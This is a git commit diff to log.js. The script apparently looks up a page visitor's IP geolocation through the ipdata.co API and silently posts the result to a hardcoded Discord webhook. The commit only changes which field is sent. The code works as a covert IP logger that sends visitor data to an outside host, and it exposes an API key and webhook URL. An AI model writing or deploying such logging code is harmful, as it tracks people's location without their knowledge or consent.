53fc67245f56020777ecbe24d4e4b4b389c8ea66
rexgamer338571 <85365081+rexgamer338571@users.noreply.github.com>
2023-08-01 01:57:38 +0200

    Update log.js

--- log.js
+++ log.js
@@ -3,7 +3,7 @@ request.open('GET',`https://api.ipdata.co/?api-key=7beb17f7537a898bfee9001e6375b
 request.setRequestHeader('Accept', 'application/json');
 request.onreadystatechange = function () {
   if (this.readyState === 4) {
-    fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText})});
+    fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText.asn})});
   }
 };
 
